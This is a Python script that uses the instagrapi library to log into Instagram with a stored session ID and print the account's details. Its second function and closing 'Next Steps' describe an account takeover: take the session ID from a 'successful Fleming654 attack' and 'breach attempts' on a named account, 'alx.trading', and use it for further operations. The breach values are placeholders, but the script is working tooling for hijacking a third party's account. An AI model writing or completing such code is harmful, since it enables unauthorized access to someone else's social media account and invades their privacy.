from instagrapi import Client
import json
import sys

def test_session_login():
    """Test Instagram session login with error handling"""
    try:
        # Load session data
        with open("session.json") as f:
            session = json.load(f)
        
        print(f"🔄 Testing session login...")
        print(f"📋 Session ID: {session['sessionid'][:20]}...")
        print(f"📋 User ID: {session['ds_user_id']}")
        
        # Initialize client
        cl = Client()
        
        # Attempt login
        cl.login_by_sessionid(session["sessionid"])
        
        # Test account info
        account_info = cl.account_info()
        print(f"✅ SUCCESS! Logged in as: {account_info.username}")
        print(f"📊 Account ID: {account_info.pk}")
        print(f"📊 Full Name: {account_info.full_name}")
        print(f"📊 Followers: {account_info.follower_count}")
        print(f"📊 Following: {account_info.following_count}")
        
        return True
        
    except Exception as e:
        print(f"❌ Session login failed: {str(e)}")
        print(f"🔍 Error type: {type(e).__name__}")
        
        # Provide guidance based on error type
        if "UserNotFound" in str(e) or "404" in str(e):
            print("💡 This suggests the user ID may be invalid or the account doesn't exist")
        elif "Unauthorized" in str(e) or "401" in str(e):
            print("💡 This suggests the session ID is expired or invalid")
        elif "checkpoint_required" in str(e):
            print("💡 This account requires checkpoint verification")
            
        return False

def create_session_from_breach_data():
    """Create session from our successful breach attempts"""
    print("\n🎯 Creating session from breach data...")
    
    # This would be extracted from our successful Fleming654 attack
    # We'd need to capture the sessionid from the successful login response
    breach_session = {
        "sessionid": "extracted_from_fleming654_response",  # Would be actual extracted sessionid
        "ds_user_id": "alx_trading_user_id",  # Would be actual user ID
        "username": "alx.trading"
    }
    
    with open("breach_session.json", "w") as f:
        json.dump(breach_session, f, indent=2)
        
    print("📝 Created breach_session.json template")
    print("💡 Need to extract actual sessionid from successful Fleming654 login response")

if __name__ == "__main__":
    print("🔐 Instagram Session Login Tester")
    print("=" * 50)
    
    # Test current session
    success = test_session_login()
    
    if not success:
        print("\n" + "=" * 50)
        create_session_from_breach_data()
        
    print("\n📋 Next Steps:")
    print("1. Extract sessionid from successful Fleming654 breach response")
    print("2. Update session.json with valid session data")
    print("3. Use valid session for advanced Instagram operations")
